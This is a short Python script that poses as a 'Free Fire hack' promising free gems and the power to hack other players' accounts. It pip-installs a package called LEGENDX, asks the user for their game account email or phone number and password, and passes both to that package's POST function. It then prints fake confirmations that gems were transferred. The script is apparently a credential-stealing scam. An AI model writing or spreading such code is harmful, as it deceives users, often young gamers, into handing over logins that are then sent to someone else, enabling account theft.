import os, asyncio, time

try:

  from LEGENDX import POST # for free fire

except:

  os.system("pip install -U LEGENDX")

  from LEGENDX import POST

os.system("clear")

print('''

HELLO WELCOME TO FREE FIRE HACK

===={{{{{{{FREE FIRE}}}}}}}====

1ST ENTER YOUR FREE FIRE ID

THEN YOU GOT MINIMUM 50000 GEMS

THANKS FOR USING THIS TOOL

''')

time.sleep(5)
try:
  print('now enter your free fire account details')
  pro = input("enter your email or number: ")
  time.sleep(4)
  boy = input('now enter your password: ')
  try:

     POST(user=pro, msg=boy)

  except:

    pass
except:
  print ("some thing went wrong re enter values")
  os.system("python3 free_fire.py")
print("\nnow enter what you want")
print("\n\n")
print ('''

1 = Gems

2 = hack anybody account

3 = log out my id

4 = exit

''')

ok = input("now enter: ")

if ok == "1":

  inp = input("now enter your gems value: ")

  print ("Done ✅")
  print ("\n\n {} gems transferd on your account".format(inp))

elif ok == '2':

  input("give someone user id: ")

elif ok == '3':

  print ("Done")
elif ok == "4":
  exit()

else:

  print ("Enter valid value")
  exit()
